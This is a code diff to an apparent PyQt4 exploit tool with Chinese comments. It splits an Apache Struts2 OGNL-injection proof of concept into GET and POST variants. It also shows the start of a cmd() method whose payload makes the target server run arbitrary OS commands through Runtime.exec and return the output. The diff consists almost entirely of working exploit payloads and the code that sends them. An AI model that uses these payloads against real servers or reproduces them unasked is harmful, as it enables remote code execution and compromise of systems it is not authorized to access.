@@ -17,20 +17,28 @@ class StartQt4(QtGui.QMainWindow):
         QtCore.QObject.connect(self.ui.comboBox, QtCore.SIGNAL("currentIndexChanged(int)"), self.mode)
         QtCore.QObject.connect(self.ui.pushButton_2, QtCore.SIGNAL("clicked()"), self.file_dialog)
 
-    def PoC(self):
-        payload= "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=Go!St2"
-        target_url = (self.address + payload)
-        #print(target_url)
+    def PoC_POST(self):
+        #此为PoC的POST方法
         try:
-            req = urllib.request.Request(target_url, method = "GET")
-            response = urllib.request.urlopen(req) 
-            if response:
-                data = response.read()
-                data = str(data, encoding = "utf-8")
-                self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
+            payload= "debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=Go!St2"
+            res = urllib.request.Request(self.address, payload.encode("utf-8"))
+            data = urllib.request.urlopen(res).read().decode("utf-8")
+            self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
         except Exception as e:
             self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
         
+
+    def PoC(self):
+        #此为PoC的GET方法
+        payload= "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=Go!St2"
+        target_url = (self.address + payload)
+        try:
+            data = requests.get(target_url).content.decode("utf-8")
+            self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
+        except Exception as e:
+            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
+
+
     def cmd(self):
         self.command = str(self.ui.command.text())
         payload= "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command="
